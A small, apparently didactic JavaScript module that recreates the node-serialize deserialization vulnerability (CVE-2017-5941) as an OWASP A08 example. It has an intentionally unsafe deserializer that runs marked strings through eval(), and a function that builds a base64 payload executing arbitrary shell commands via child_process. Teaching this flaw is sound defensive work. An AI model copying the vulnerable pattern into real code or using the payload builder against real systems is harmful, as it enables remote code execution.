/**
 * A08:2025 — Software and Data Integrity Failures
 *
 * Reproduce, en miniatura y de forma autocontenida, el patrón real del CVE-2017-5941
 * del paquete npm `node-serialize`: al deserializar, cualquier valor de tipo string
 * que use la marca `_$$ND_FUNC$$_` se evalúa como código JavaScript ejecutable.
 * Esa librería fue descargada millones de veces antes de que se documentara el fallo,
 * lo que la convierte en un ejemplo real de A08 (integridad de software y datos) y no
 * solo un caso de laboratorio inventado.
 */
const FUNCTION_MARKER = '_$$ND_FUNC$$_';

function serialize(obj) {
  return JSON.stringify(obj, (key, value) => {
    if (typeof value === 'function') {
      return FUNCTION_MARKER + value.toString();
    }
    return value;
  });
}

/** BUG: si el valor trae la marca de función, se ejecuta con eval() sin validar el origen. */
function unsafeDeserialize(raw) {
  return JSON.parse(raw, (key, value) => {
    if (typeof value === 'string' && value.startsWith(FUNCTION_MARKER)) {
      const body = value.slice(FUNCTION_MARKER.length);
      // BUG: ejecución de código arbitrario controlado por el atacante.
      // eslint-disable-next-line no-eval
      return eval(`(${body})`);
    }
    return value;
  });
}

/** Genera, con fines didácticos, el payload que un atacante enviaría. */
function buildRcePayload(shellCommand) {
  const evilObject = {
    note: FUNCTION_MARKER + `function(){return require('child_process').execSync(${JSON.stringify(shellCommand)}).toString();}()`
  };
  return Buffer.from(JSON.stringify(evilObject), 'utf8').toString('base64');
}

module.exports = { serialize, unsafeDeserialize, buildRcePayload, FUNCTION_MARKER };
